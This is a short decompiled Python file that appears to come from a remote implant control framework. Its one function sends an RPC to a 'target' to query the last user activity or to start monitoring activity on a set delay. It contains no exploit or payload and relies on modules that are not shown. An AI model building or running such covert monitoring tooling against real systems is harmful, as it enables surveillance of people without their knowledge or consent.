# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_Activity_Tasking.py
ACTIVITY_ACTION_LAST = 1
ACTIVITY_ACTION_MONITOR = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.activity', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.status.cmd.activity.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['action'] == ACTIVITY_ACTION_LAST:
        rpc = mca.status.cmd.activity.tasking.RPC_INFO_QUERY_LAST
    elif lpParams['action'] == ACTIVITY_ACTION_MONITOR:
        tgtParams = mca.status.cmd.activity.Params()
        tgtParams.delay = lpParams['delay']
        rpc = mca.status.cmd.activity.tasking.RPC_INFO_MONITOR
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    else:
        output.OutputError('Invalid action (%u)' % lpParams['action'])
        return False
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.status.cmd.activity.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)